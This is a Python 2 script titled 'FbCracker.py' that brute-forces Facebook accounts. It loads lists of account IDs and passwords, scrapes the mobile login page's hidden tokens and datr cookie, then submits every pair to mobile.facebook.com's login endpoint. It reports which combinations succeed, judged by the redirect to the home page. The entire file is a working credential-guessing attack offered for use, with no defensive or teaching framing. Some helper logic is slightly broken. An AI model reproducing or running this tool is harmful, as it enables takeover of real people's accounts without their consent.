import requests,os,sys
requests.packages.urllib3.disable_warnings()

class stx:    
	RED='\033[1;31m'
	brown='\033[0;33m'
	Blue='\033[0;34m'
	Green='\033[1;32m'    
	FAIL = '\033[91m'
	ENDC = '\033[0m'
	yel = '\033[93m'
	White='\033[1;37m'
	crims=' \033[1;38m'
	magenta='\033[1;35m'
	me='FbCracker.py'									
	lin='\n---------------------------------------------------------------------------------\n'
	prxs = { "http"  : "http://127.0.0.1:8080", "https" : "https://127.0.0.1:8080",   "ftp"   : "ftp://127.0.0.1:8080"}
	slp=1
def getCookie(req,cokname):
	cokz=req.headers['Set-Cookie']
	v=cokz.split(cokname+'=')
	v2=v[1].split(';')
	d=v2[0]
	return d
def getPar(tex,parname):
	xx = tex.split('name="'+parname+'" value="')
	xz = xx[1].split('"')	
	return xz[0]
def leaveusage():
	print '[+] Usage \n 	python '+stx.me+' ids.txt password.txt'
	exit()
def leavPasswordListNotFound(p):
	print(stx.RED+'File not found ['+p+'] '+stx.Green)
	exit()
def leavPasswordListEmpty():
	print(stx.RED+' Empty password lists')
	exit()
def listtostr(l):
	x=''
	for m in l :
		x =x+m+','
	x=x[0:len(x)-2]
def load():
	global idlist,paswordlist,ipath,ppath
	idlist=[]
	paswordlist=[]
	ipath=''
	ppath=''
	if len(sys.argv) < 2:
		leaveusage()
	else:
		ipath=sys.argv[1]
		if os.path.isfile(ipath):
			with open(ipath) as strm:
				lines=strm.readlines()
				for lx in lines:
					l=lx.strip()
					if l in  idlist:
						continue
					elif len (l)> 2:
						idlist.append(l.strip())
		else :
			v=sys.argv[1]
			if ',' in v :
				vx = v.split(',')
				for b in vx :
					if b in idlist:
						continue
					else:
						idlist.append(b)
			else:
				idlist.append(sys.argv[1])

		if len(sys.argv) > 2:
			ppath=sys.argv[2]
		else:
			ppath='passwordlist.txt'

	passPaths=[]
	if ',' in ppath:
		passPaths=ppath.split(',')
	else:
		passPaths=[ppath]
	notfound=True
	for pypath in passPaths:
		notfound=False
		if os.path.isfile(pypath):
			with open(pypath) as strm2 :
				lines=strm2.readlines()
				for _pasword_ in lines:
					p=_pasword_.strip()
					if p in paswordlist:
						continue
					elif len(p) > 5:
						paswordlist.append(p)
	if notfound:
			leavPasswordListNotFound(ppath)
	elif len(paswordlist) < 1:
		leavPasswordListEmpty()
def info ():
	global idlist,paswordlist,ipath,ppath
	ids=str(len(idlist))+", "
	if len(idlist) < 6:
		ids=''
		for i in idlist:
			ids = ids+i +', '
		if ',' in ipath:
			ids ='     ['+stx.Green+ids
		elif len(idlist) >1 :
			ids ='From ['+ipath+']  ['+stx.Green+ids 
		else :	
			ids="     ["+stx.Green+listtostr(idlist)+stx.yel+", "
	print stx.yel+'Ids       loaded '+ids[0:len(ids)-2]+stx.yel+"]"
	print         'Passwords loaded From ['+stx.Green+ppath+stx.yel+'] ['+stx.Green+str(len(paswordlist))+stx.yel+"]"+stx.lin


def execmain ():
	global idlist,paswordlist
	print(stx.yel)

	#idlist=['9ersy','they.are.anonymous']
	#paswordlist=['y1a2s3VITA!@#$','y1a2s3VITA!@#','y1a2s3vita','y1a2s3xd','y1a2s3s4','y1a2s3s4e5r6']

	url1='https://mobile.facebook.com/'
	h1={"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:48.0) Gecko/20100101 Firefox/48.0","Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Accept-Language": "en-US,en;q=0.5","Upgrade-Insecure-Requests": "1"}
	r1=requests.get(url=url1,headers=h1)
	sucs=False
	li=''
	lsd=''
	m_ts=''
	datr=''

	print('Requesting Tokens ...')
	if r1.status_code==200:
		if 'name="li" value="' in r1.text:
			li=getPar(r1.text,'li')		
			print('  [+}Success    Token[li]      ='+li)
	
			lsd=getPar(r1.text,'lsd')
			print('                Token[lsd]     ='+lsd)

			m_ts=getPar(r1.text,'m_ts')
			print('                Token[m_ts]    ='+m_ts)

			datr=getCookie(r1,'datr')
			print('                Session[datr]  ='+datr)


	i=0
	for idx in idlist:
		i=1+i
		p=0
		_id_=idx
		print stx.Blue+'------------------------Trying['+idx+']------------------------\n'
		for pasx in paswordlist:
			p=p+1
			i2="["+str(i)+"] ["+str(p)+"]  "
			_pas_=pasx
			url2='https://mobile.facebook.com/login.php?refsrc=https%3A%2F%2Fmobile.facebook.com%2F&lwv=100&login_try_number=1&refid=8'
			h2={"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:48.0) Gecko/20100101 Firefox/48.0","Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
				,"Accept-Language": "en-US,en;q=0.5","Referer":"https://mobile.facebook.com/"
				,"Cookie":"datr="+datr+"; reg_fb_ref=https%3A%2F%2Fmobile.facebook.com%2F; reg_fb_gate=https%3A%2F%2Fmobile.facebook.com%2F; m_ts="+m_ts
				,"Upgrade-Insecure-Requests": "1"
				,"Content-Type":"application/x-www-form-urlencoded"}


			data2='lsd='+lsd+'&charset_test=%E2%82%AC%2C%C2%B4%2C%E2%82%AC%2C%C2%B4%2C%E6%B0%B4%2C%D0%94%2C%D0%84&version=1&ajax=0&width=0&pxr=0&gps=0&dimensions=0&m_ts='+m_ts+'&li='+li+'&email='+_id_+'&pass='+_pas_+'&login=Log+In'
			r2=requests.post(url=url2,data=data2,headers=h2,allow_redirects=False)#,proxies=stx.prxs)
			redir=''
			try:
				redir=r2.headers['Location']
			except Exception,e:
				redir=str(r2.status_code)

			if redir.startswith('https://mobile.facebook.com/home.php') or redir.startswith('https://mobile.facebook.com/login/save-device/') :
				print(stx.Green+i2+"  Valid   credits [ '"+_id_+"' : '"+_pas_+"'  ]")
				break
			elif redir.startswith('https://mobile.facebook.com/login/?'):
				print(stx.RED+i2+"  inValid credits [ '"+_id_+"' : '"+_pas_+"'  ]")
			else :
				print stx.Blue+i2+redir,r2.status_code



if __name__=='__main__':
	os.system('clear')
	load()
	info()
	execmain()

